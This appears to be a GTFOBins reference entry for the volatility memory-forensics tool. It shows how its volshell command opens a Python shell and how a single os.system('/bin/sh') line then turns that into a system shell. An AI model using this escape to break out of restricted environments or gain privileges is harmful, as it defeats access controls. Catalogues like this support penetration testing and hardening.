---
description: This command requires some valid coredump file which, if not available, can be uploaded to the target. The `volshell` command spawns a [`python`](/gtfobins/python/) shell, other functions may apply.
functions:
  shell:
    - code: |
        volatility -f file.dump volshell
        __import__('os').system('/bin/sh')
---
